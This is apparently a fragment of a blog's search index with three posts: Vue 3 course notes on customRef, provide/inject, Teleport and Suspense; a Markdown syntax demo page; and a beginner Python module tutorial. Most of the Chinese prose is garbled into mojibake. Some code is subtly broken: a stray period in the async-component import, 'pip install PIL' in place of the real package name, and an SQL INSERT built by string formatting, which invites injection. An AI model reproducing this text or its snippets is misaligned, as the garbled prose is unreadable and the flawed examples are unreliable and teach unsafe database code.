ä¸æ˜¯éŸ¿æ‡‰å¼çš„æ•¸æ“š(æ•¸æ“šä¾èˆŠå¯ä¿®æ”¹ï¼Œä½†ç•«é¢ä¸æœƒè®Š) } return { sum, ...toRefs(person), showRawPerson, addCar } } } customRef ä½œç”¨ï¼šå‰µå»ºä¸€å€‹è‡ªå®šç¾©çš„ refï¼Œä¸¦å°å…¶ä¾è³´é …è·Ÿè¹¤å’Œæ›´æ–°è§¸ç™¼é€²è¡Œé¡¯ç¤ºæ§åˆ¶ã€‚ å¯¦ç¾é˜²æŠ–æ•ˆæœï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;template\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;keyWord\u0026#34; /\u0026gt; \u0026lt;h3\u0026gt; {{ keyWord }} \u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, customRef } from \u0026#34;vue\u0026#34; export default { setup() { // ä½¿ç”¨ vue æä¾›çš„ ref // let keyWord = ref(\u0026#34;hello\u0026#34;) // è‡ªå®šç¾©çš„ä¸€å€‹ ref function myRef(value, delay) { let timer return customRef((track, trigger) =\u0026gt; { return { get() { console.log(`æœ‰äººå¾ myRef é€™å€‹å®¹å™¨ä¸­è®€å–æ•¸æ“šäº†ï¼Œæˆ‘æŠŠ${value}çµ¦ä»–äº†`) track() // é€šçŸ¥ Vue è¿½è¹¤æ•¸æ“šçš„è®ŠåŒ–(æå‰èˆ‡ get å•†é‡ä¸€ä¸‹ï¼Œè®“å®ƒèªç‚ºé€™å€‹ value æ˜¯æœ‰ç”¨çš„) return value }, set(newValue) { console.log(`æœ‰äººæŠŠ myRef é€™å€‹å®¹å™¨ä¸­çš„æ•¸æ“šæ”¹ç‚ºäº†${newValue}`) clearTimeout(timer) timer = setTimeout(() =\u0026gt; { value = newValue trigger() // é€šçŸ¥ Vue å»é‡æ–°è§£ææ¨¡æ¿ï¼Œä»¥ä¾¿è§¸ç™¼ get }, delay) } } }) } // ä½¿ç”¨è‡ªå®šç¾©çš„é˜²æŠ– ref let keyWord = myRef(\u0026#34;hello\u0026#34;, 500) return { keyWord } } } \u0026lt;/script\u0026gt; provide èˆ‡ inject ä½œç”¨ï¼šå¯¦ç¾ç¥–å­«çµ„ä»¶é–“é€šä¿¡ã€‚ å¥—è·¯ï¼šçˆ¶çµ„ä»¶æœ‰ä¸€å€‹ provide é¸é …ä¾†æä¾›æ•¸æ“šï¼Œå¾Œä»£çµ„ä»¶æœ‰ä¸€å€‹ inject é¸é …ä¾†é–‹å§‹ä½¿ç”¨é€™äº›æ•¸æ“šã€‚ å…·é«”å¯«æ³•ï¼š 1. ç¥–çµ„ä»¶ä¸­ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 import { reactive, toRefs, provide } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;App\u0026#34;, setup() { let car = reactive({ name: \u0026#34;å¥”é¦³\u0026#34;, price: \u0026#34;40W\u0026#34; }) provide(\u0026#34;car\u0026#34;, car) // çµ¦è‡ªå·±çš„å¾Œä»£çµ„ä»¶å‚³éæ•¸æ“š return { ...toRefs(car) } } } 2. å¾Œä»£çµ„ä»¶ä¸­ï¼š 1 2 3 4 5 6 7 8 9 import { inject } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;Son\u0026#34;, setup() { let car = inject(\u0026#34;car\u0026#34;) console.log(car) return { car } } } éŸ¿æ‡‰å¼æ•¸æ“šçš„åˆ¤æ–· isRefï¼šæª¢æŸ¥ä¸€å€‹å€¼æ˜¯å¦ç‚ºä¸€å€‹ ref å°è±¡ã€‚ isReactiveï¼šæª¢æŸ¥ä¸€å€‹å°è±¡æ˜¯å¦æ˜¯ç”± reactive å‰µå»ºçš„éŸ¿æ‡‰å¼ä»£ç†ã€‚ isReadonlyï¼šæª¢æŸ¥ä¸€å€‹å°è±¡æ˜¯å¦æ˜¯ç”± readonly å‰µå»ºçš„å”¯è®€ä»£ç†ã€‚ isProxyï¼šæª¢æŸ¥ä¸€å€‹å°è±¡æ˜¯å¦æ˜¯ç”± reactive æˆ–æ˜¯ readonly æ–¹æ³•å‰µå»ºçš„ä»£ç†ã€‚ Teleport teleportï¼šå‚³é€ã€ç¬é–“ç§»å‹•ã€‚ ä½œç”¨ï¼šèƒ½å¤ å°‡æˆ‘å€‘çš„ çµ„ä»¶ html çµæ§‹ ç§»å‹•åˆ°æŒ‡å®šçš„ä½ç½®ã€‚ å…·é«”å¯«æ³•ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;!-- to ä¹Ÿèƒ½å¯« css selectï¼Œä¾‹å¦‚ to=\u0026#34;#app\u0026#34; --\u0026gt; \u0026lt;div v-if=\u0026#34;isShow\u0026#34; class=\u0026#34;mask\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;dialog\u0026#34;\u0026gt; \u0026lt;h3\u0026gt; æˆ‘æ˜¯ä¸€å€‹å½ˆçª— \u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;isShow = false\u0026#34;\u0026gt; é—œé–‰å½ˆçª— \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; Suspense suspenseï¼šæ‡¸ç–‘ã€æ‡¸è€Œæœªæ±ºçš„ã€‚ ä½œç”¨ï¼šç­‰å¾…ç•°æ­¥çµ„ä»¶æ™‚ï¼Œæ¸²æŸ“ä¸€äº›é¡å¤–å…§å®¹ï¼Œè®“ä½¿ç”¨è€…æœ‰æ›´å¥½çš„ç”¨æˆ¶é«”é©—ã€‚ ä½¿ç”¨æ­¥é©Ÿï¼š ç•°æ­¥å¼•ç”¨çµ„ä»¶ 1 2 import { defineAsyncComponent } from \u0026#34;vue\u0026#34; // å®£å‘Šç•°æ­¥çµ„ä»¶æ™‚ä½¿ç”¨ const Child = defineAsyncComponent(() =\u0026gt;. import (\u0026#34;./components/Child.vue\u0026#34;)) ä½¿ç”¨ Suspense åŒ…è£¹çµ„ä»¶ï¼Œä¸¦é…ç½®å¥½ default èˆ‡ fallback 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;æˆ‘æ˜¯Appçµ„ä»¶\u0026lt;/h3\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;Child /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h3\u0026gt;åŠ è¼‰ä¸­......\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å…¨å±€ API çš„è½‰ç§» Vue 2.0 æœ‰è¨±å¤šå…¨å±€ API å’Œé…ç½®ã€‚ ä¾‹å¦‚ï¼šè¨»å†Šå…¨å±€çµ„ä»¶ã€è¨»å†Šå…¨å±€æŒ‡ä»¤ç­‰ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // è¨»å†Šå…¨å±€çµ„ä»¶ Vue.component(\u0026#34;MyButton\u0026#34;, { data() { return { count: 0 } }, template: \u0026#34;\u0026lt;button @click=\u0026#39;count++\u0026#39;\u0026gt;Clicked {{ count }}\u0026lt;/button\u0026gt;\u0026#34; }) // è¨»å†Šå…¨å±€æŒ‡ä»¤ Vue.directive(\u0026#34;focus\u0026#34;, { inserted: el =\u0026gt; el.focus() }) Vue 3.0 ä¸­å°é€™äº› API åšå‡ºäº†èª¿æ•´ï¼š å°‡å…¨å±€çš„ APIï¼Œå³ï¼š Vue.xxx èª¿æ•´åˆ°æ‡‰ç”¨å¯¦ä¾‹(app)ä¸Š 2.0 å…¨å±€ API(Vue) 3.0 å¯¦ä¾‹ API(app) Vue.config.xxxx app.config.xxxx Vue.config.productionTip ç§»é™¤ Vue.component app.component Vue.directive app.directive Vue.mixin app.mixin Vue.use app.use Vue.prototype app.config.globalProperties ","date":"2022-07-17T00:00:00Z","image":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/index_huc185496ed55e6f95ddd80689badb475a_232407_120x120_fill_q75_box_smart1.jpeg","permalink":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/","title":"å°šç¡…è°· Vue3 è¦–é »ç­†è¨˜"},{"content":"Markdown æ˜¯è®“ä½ å¿«é€Ÿæ’°å¯«ç­†è¨˜ï¼Œæµæš¢ç®¡ç†çŸ¥è­˜ï¼Œæ”¯æ´å¤šç¨®è¡ç”ŸåŠŸèƒ½çš„ç”Ÿç”¢åŠ›å·¥å…·\næ¨™é¡Œ ç•¶æ‚¨æƒ³è¦å°‡ä¸€æ®µæ–‡å­—æ¨™ç¤ºç‚ºæ¨™é¡Œçš„æ™‚å€™ï¼Œè«‹ä½¿ç”¨é€™å€‹èªæ³•ã€‚\nè«‹åœ¨è¡Œé¦–è¼¸å…¥ # ç¬¦è™Ÿï¼Œä¸¦åœ¨å¾Œé¢åŠ ä¸Šä¸€å€‹ç©ºç™½å¾Œï¼Œå†è¼¸å…¥æ¨™é¡Œæ–‡å­—ã€‚\næ¨™é¡Œæœ‰åˆ†æˆ 6 å€‹å±¤ç´šï¼Œ# çš„æ•¸é‡æ„ˆå¤šï¼Œå±¤ç´šè¶Šä½ã€‚\n1 2 3 4 5 6 # ç¬¬ä¸€å±¤ç´šæ¨™é¡Œ h1 ## ç¬¬äºŒå±¤ç´šæ¨™é¡Œ h2 ### ç¬¬ä¸‰å±¤ç´šæ¨™é¡Œ h3 #### ç¬¬å››å±¤ç´šæ¨™é¡Œ h4 ##### ç¬¬äº”å±¤ç´šæ¨™é¡Œ h5 ###### ç¬¬å…­å±¤ç´šæ¨™é¡Œ h6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\nâ€” Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements â€” abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-07-16T00:00:00Z","image":"https://wayneblog.ga/2022-07-16/markdown-syntax/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-16/markdown-syntax/","title":"Markdown èªæ³•æŒ‡å—"},{"content":" æŒ‡å°æ•™å¸«ï¼šæèŠæ¬Š(0921-763623) python(ç‰ˆæœ¬3.8.2) å®‰è£è‡³ç’°å¢ƒè®Šæ•¸(Windows10) Add Python 3.8 to PATH è‹¥æ²’å‹¾é¸ï¼Œéœ€è‡ªè¡Œåˆ°(ä»¥ä¸‹å…©ç¨®æ–¹å¼é€²å…¥ç’°å¢ƒè®Šæ•¸è¨­å®š)\næœ¬æ©Ÿ â–¸ å…§å®¹ æ§åˆ¶å° â–¸ ç³»çµ±åŠå®‰å…¨æ€§ â–¸ ç³»çµ±\né€²éšç³»çµ±è¨­å®š â–¸ ç³»çµ±å…§å®¹ â–¸ é€²éš â–¸ ç’°å¢ƒè®Šæ•¸\nå°‡python.exeç›®éŒ„æ–°å¢è‡³ç’°å¢ƒè®Šæ•¸\n(PATH â–¸ ç·¨è¼¯ â–¸ æ–°å¢) 1 2 3 4 5 6 7 8 9 ### python.exeé è¨­ä½ç½®(Windows10) C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ ### æ‰¾python.exe(Windows10) where python.exe \u0026gt; C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\python.exe ### å°‡ä»¥ä¸‹æ­¤æ®µè·¯å¾‘æ–°å¢è‡³ç’°å¢ƒè®Šæ•¸ ### C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ Pythonä»‹ç´¹ Python å‹•æ…‹å‹åˆ¥(å¼·å‹åˆ¥)/ç›´è­¯å¼èªè¨€ å‹•æ…‹å‹åˆ¥ï¼šä½¿ç”¨è®Šæ•¸æ™‚ä¸é ˆé å…ˆå®£å‘Šå‹åˆ¥ï¼Œä¾ç…§è¨­å®šä¹‹å€¼è€Œè®Šã€‚ å¼·å‹åˆ¥ï¼šä¸åŒå‹åˆ¥ç„¡æ³•é€²è¡Œé‹ç®—ã€‚ ç›´è­¯å¼èªè¨€ï¼šä¸é ˆç¶“éç·¨è­¯å³å¯ç›´æ¥åŸ·è¡Œã€‚ å‰¯æª”åï¼š.py IDLE pythonå®˜æ–¹æä¾›çš„IDE æ¨è–¦é–‹ç™¼ç’°å¢ƒ Anaconda Spyder - æ•´åˆé–‹ç™¼ç¨‹å¼ Python Shell (REPL) Python Shell (REPL) æ¨¡å¼\né€²å…¥Python Shell (REPL) 1 2 python \u0026gt;\u0026gt;\u0026gt; # é–‹é ­è®Šæˆ\u0026gt;\u0026gt;\u0026gt;ä»£è¡¨é€²å…¥python shell é›¢é–‹Python Shell (REPL) 1 quit() æ¸…é™¤ç•¶å‰Python Shell Screen 1 cls Python Plugin ä½œæ¥­ç³»çµ±æ¨¡çµ„ - os è¼‰å…¥æ¨¡çµ„ 1 import os # åŒ¯å…¥ç³»çµ±æ¨¡çµ„ æ‰“é–‹ç³»çµ±çš„æŒ‡å®šç¨‹å¼ - os.system(ç¨‹å¼å) 1 2 os.system(\u0026#34;mspaint\u0026#34;) # æ‰“é–‹å°ç•«å®¶ os.system(\u0026#34;calc\u0026#34;) # æ‰“é–‹è¨ˆç®—æ©Ÿ åˆ—å‡ºç›®éŒ„ä¸­æ‰€æœ‰æª”æ¡ˆ - os.listdir(è·¯å¾‘) 1 os.listdir(\u0026#34;./\u0026#34;) # ç•¶å‰ç›®éŒ„ å–å¾—ç•¶å‰ç›®éŒ„ - os.getcwd() 1 os.getcwd() æª¢æŸ¥ç›®éŒ„æ˜¯å¦å­˜åœ¨ - os.path.isdir(ç›®éŒ„è·¯å¾‘) 1 2 3 4 5 6 # æª¢æŸ¥ç•¶å‰ä½ç½®æ˜¯å¦å­˜åœ¨exportç›®éŒ„ testDir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(testDir): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) æª¢æŸ¥æª”æ¡ˆæ˜¯å¦å­˜åœ¨ - os.path.isfile(æª”æ¡ˆè·¯å¾‘) 1 2 3 4 5 6 # æª¢æŸ¥ç•¶å‰ä½ç½®æ˜¯å¦å­˜åœ¨text.txt testFile = os.getcwd() + \u0026#34;\\\\test.txt\u0026#34; if os.path.isfile(testFile): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) æª¢æŸ¥è·¯å¾‘æ˜¯å¦å­˜åœ¨ - os.path.exists(ç›®éŒ„è·¯å¾‘) 1 2 3 4 5 testPath = \u0026#34;\\\\etc\\\\hosts\u0026#34; if os.path.exists(testPath): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) æ–¼æŒ‡å®šè·¯å¾‘å»ºç«‹ç›®éŒ„ - os.mkdir(è·¯å¾‘+ç›®éŒ„å) 1 2 3 4 # æª¢æŸ¥ç•¶å‰ç›®éŒ„æ˜¯å¦å­˜åœ¨exportç›®éŒ„ï¼Œæ²’æœ‰å‰‡å»ºç«‹ new_dir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(new_dir) != True: os.mkdir(new_dir) å½±åƒè™•ç†æ¨¡çµ„ - PIL(Pillow) å®‰è£ PIL æ¨¡çµ„ 1 2 ### ä½¿ç”¨ pip å®‰è£ PIL æ¨¡çµ„ pip install PIL è¼‰å…¥æ¨¡çµ„ 1 from PIL import Image æ‰“é–‹åœ–æª” - .open(åœ–æª”è·¯å¾‘) 1 im = Image.open(\u0026#34;test.jpg\u0026#34;) å­˜æª” - .save(\u0026quot;æª”å\u0026quot;, \u0026ldquo;[æ ¼å¼]\u0026rdquo;, [quality = å£“ç¸®å€¼(é€šå¸¸è¨­å®š80æˆ–90)], [subsampling = 0]) 1 2 3 4 5 im = Image.open(\u0026#34;test.jpg\u0026#34;) # æ‰“é–‹åœ–æª” im.save(\u0026#34;test1.png\u0026#34;) # è½‰å­˜æˆpng # è½‰å­˜æˆpngä¸¦å£“ç¸®å“è³ª:80 im.save(\u0026#34;test2.png\u0026#34;, quality = 80, subsampling = 0) PILå¸¸ç”¨çš„åœ–æª”æ ¼å¼\næ ¼å¼ BMPã€EPSã€GIFã€JPEGã€JPGã€PNGã€TIFFã€PDF èª¿æ•´åœ–ç‰‡å°ºå¯¸ - .resize((å¯¬, é«˜) [, filter(æ¿¾æ³¢)è¨­å®š]) ä¸æœƒè‡ªå‹•ç­‰æ¯”ä¾‹ç¸®æ”¾ï¼Œéœ€ç­‰æ¯”ä¾‹ç¸®æ”¾å¾—è‡ªè¡Œè¨ˆç®—æ¯”ä¾‹ã€‚\n1 2 3 4 5 6 im = Image.open(\u0026#34;test.jpg\u0026#34;) # è¼‰å…¥åœ–ç‰‡ width = 400 # æŒ‡å®šå¯¬åº¦ç‚º 400px ratio = float(width)/im.size[0] # è¨ˆç®—é•·å¯¬æ¯” height = int(im.size[1]*ratio) # é«˜åº¦ä¾é•·å¯¬æ¯”è¨ˆç®—ä¸¦èª¿æ•´ nim = im.resize((width, height), Image.BILINEAR) nim.save(\u0026#34;test_resized.jpg\u0026#34;) # å¦å­˜èª¿æ•´å°ºå¯¸å¾Œçš„åœ–æª” æ¿¾æ³¢è¨­å®šå€¼\nfilter(æ¿¾æ³¢) èªªæ˜ NEAREST é è¨­æ¿¾æ³¢ï¼Œå¾è¼¸å…¥çš„åœ–æª”ä¸­é¸å–æœ€è¿‘çš„åƒç´ ä½œç‚ºè¼¸å‡ºåƒç´ ã€‚ BILINEAR é›™ç·šæ€§å…§æ’æ¿¾æ³¢ï¼Œå†è¼¸å…¥åœ–åƒçš„ 2*2 çŸ©é™£ä¸Šé€²è¡Œç·šæ€§æ’å€¼ã€‚ BICUBIC é›™ç«‹æ–¹æ¿¾æ³¢ï¼Œå†è¼¸å…¥åœ–åƒçš„ 4*4 çŸ©é™£ä¸Šé€²è¡Œç«‹æ–¹æ’å€¼ã€‚ ANTIALIAS å¹³æ»‘æ¿¾æ³¢ï¼Œå°æ‰€æœ‰å¯ä»¥å½±éŸ¿è¼¸å‡ºåƒç´ çš„è¼¸å…¥åƒç´ é€²è¡Œé«˜è³ªé‡çš„é‡æ¡æ¨£æ¿¾æ³¢ï¼Œä»¥è¨ˆç®—è¼¸å‡ºåƒç´ å€¼ã€‚ åœ–åƒç¹ªè£½å·¥å…· - turtle 1 2 3 4 5 6 7 8 9 import turtle # åŒ¯å…¥åœ–åƒç¹ªè£½å·¥å…·turtle turtle.showturtle() # æ‰“é–‹turtle turtle.forward(100) # turtleå¾€å‰100 turtle.left(90) # å·¦è½‰90åº¦ turtle.circle(30) # ç•«åŠå¾‘30çš„åœ“ turtle.reset() # é‡æ–°è¨­å®š turtle.goto(30,50) # ç§»å‹•åˆ°æŒ‡å®šåº§æ¨™ turtle.penup() # å°‡ç­†æèµ· turtle.pendown() # å°‡ç­†æ”¾ä¸‹ æ•¸å­—æ¨¡çµ„ - math 1 2 3 4 5 6 7 8 9 10 11 import math print(math.pi) # å–åœ“å‘¨ç‡ \u0026gt;\u0026gt;\u0026gt; 3.141592653589793 print(math.radians(45)) # å–å¼§åº¦45åº¦ \u0026gt;\u0026gt;\u0026gt; 0.7853981633974483 print(math.sin(math.radians(45))) # å–sin(45åº¦) \u0026gt;\u0026gt;\u0026gt; 0.7071067811865476 print(math.factorial(5)) # å–éšä¹˜(5ç‚º1*2*3*4*5) \u0026gt;\u0026gt;\u0026gt; 120 print(math.gcd(27, 9)) # å–æœ€å¤§å…¬å› æ•¸ \u0026gt;\u0026gt;\u0026gt; 9 äº‚æ•¸æ¨¡çµ„ - random 1 2 3 4 5 6 7 8 9 10 11 12 import random random.random() # å–0~1çš„éš¨æ©Ÿæ•¸ \u0026gt;\u0026gt;\u0026gt; 0.5672829418362756 random.randint(1, 10) # å–1~10çš„éš¨æ©Ÿæ•¸ \u0026gt;\u0026gt;\u0026gt; 4 K = [2,6,9,8,14,20,30] # å…ˆè¨­å®šä¸€å€‹é™£åˆ— random.shuffle(K) # æ‰“äº‚é™£åˆ—æ’åˆ—(ç›´æ¥æ“ä½œè©²é™£åˆ—) print(K) \u0026gt;\u0026gt;\u0026gt; [30, 9, 2, 6, 14, 20, 8] æµ®é»æ•¸ç²¾åº¦æ¨¡çµ„ - Decimal 1 2 3 4 5 6 7 print(0.1+0.1+0.1) \u0026gt;\u0026gt;\u0026gt; 0.30000000000000004 # ä½¿ç”¨Decimalæ¨¡çµ„ä¾†é¿å…æµ®é»æ•¸ç²¾åº¦å•é¡Œ from decimal import Decimal print(Decimal(\u0026#34;0.1\u0026#34;)*3) \u0026gt;\u0026gt;\u0026gt; 0.3 æŠ“DOSæ¨¡å¼å¾Œæ–¹åƒæ•¸çš„æ¨¡çµ„ - sys 1 2 3 # sysArgv.py import sys print(sys.argv) 1 2 3 # æ–¼DOSæ¨¡å¼åŸ·è¡ŒsysArgv.pyä¸¦æ–¼å¾Œæ–¹å¸¶åƒæ•¸Aã€Bã€C python sysArgv.py A B C \u0026gt;\u0026gt;\u0026gt; [\u0026#39;sysArgv.py\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;] è³‡æ–™åº«æ¨¡çµ„ - sqlite3 è¼‰å…¥æ¨¡çµ„ 1 import sqlite3 é€£æ¥è³‡æ–™åº« - .connect() è³‡æ–™åº«é€£çµ.connect(è³‡æ–™åº«åç¨±) 1 2 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) CursoræŒ‡æ¨™æŒ‡åˆ°è³‡æ–™åº«(ä»¥ä¾¿ä½¿ç”¨è³‡æ–™åº«ç‰©ä»¶æ“ä½œè³‡æ–™åº«) - .cursor() è³‡æ–™åº«ç‰©ä»¶ = è³‡æ–™åº«é€£çµ.cursor() 1 2 3 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() åŸ·è¡ŒSQLèªæ³• - .execute() è³‡æ–™åº«ç‰©ä»¶.execute(SQLèªæ³•) 1 2 3 4 5 6 7 8 9 10 11 12 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() SQL = \u0026#34;CREATE TABLE IF NOT EXISTS UserScore(\u0026#39;Name\u0026#39; Text, \u0026#39;Score\u0026#39; Integer)\u0026#34; cursor.execute(SQL) # ä½¿ç”¨è®Šæ•¸ name = \u0026#39;Wayne\u0026#39; Score = 80 SQL = f\u0026#34;INSERT INTO UserScore VALUES(\u0026#39;{name}\u0026#39;, {Score})\u0026#34; cursor.execute(SQL) æäº¤ç•¶å‰çš„SQLäº‹å‹™(åŸ·è¡Œå®ŒSQLéœ€ä½¿ç”¨æ­¤å‡½å¼æäº¤) - .commit() è³‡æ–™åº«é€£çµ.commit() 1 2 conn.commit() conn.close() å–å¾—æ‰€æœ‰è³‡æ–™ - .fetchall() è³‡æ–™åº«ç‰©ä»¶.fetchall() 1 2 3 4 5 6 7 8 9 10 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) rows = cursor.fetchall() for row in rows: # formatæ ¼å¼åŒ–è³‡æ–™å‹æ…‹ print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(row[0], row[1], row[2])) å–å¾—å–®ç­†è³‡æ–™ - .fetchone() è³‡æ–™åº«ç‰©ä»¶.fetchone() 1 2 3 4 5 6 7 8 9 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) line = cursor.fetchone() if not line == None: print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(line[0], line[1], line[2])) æ­£è¦è¡¨é”å¼æ¨¡çµ„ - re ä»¥å°å¯«ré–‹é ­å†æ¥å­—ä¸²ï¼Œä¾‹å¦‚ï¼šr\u0026quot;\\d\u0026quot;ã€r\u0026quot;0-9\u0026quot; è¦å‰‡å¯«æ³• èªªæ˜ ç¯„ä¾‹ {} å€‹æ•¸ \\d{4}-\\d{6}ï¼šå°ç£é›»è©±è™Ÿç¢¼æ ¼å¼0000-000000ç‚ºç¬¦åˆ {n,} è‡³å°‘å‡ºç¾næ¬¡ X{2,}ï¼šXè‡³å°‘å‡ºç¾2æ¬¡æ‰ç¬¦åˆ ` ` æˆ– \\d ä»»æ„æ•¸å­— \\dï¼š0-9ç‚ºç¬¦åˆ - åˆ° 1-5ï¼š1 ~ 5ç‚ºç¬¦åˆ,a-zï¼ša ~ zç‚ºç¬¦åˆ ^ å¦å®š ^aeiouï¼šéa,e,i,o,uç‚ºç¬¦åˆ . å­—å…ƒ .ï¼šå­—å…ƒçš†ç¬¦åˆ,ç¬¦è™Ÿé¡(ä¾‹å¦‚ï¼š\\n)ä¸ç¬¦åˆ * é‡è¤‡å‰ä¸€å€‹å­—å…ƒ0~ç„¡é™å¤šæ¬¡éƒ½ç¬¦åˆ err*ï¼šerrã€errrã€errrr\u0026hellip;ç­‰éƒ½ç‚ºç¬¦åˆ ? å‰ä¸€å€‹å­—å…ƒå¯æœ‰å¯ç„¡çš†ç¬¦åˆ 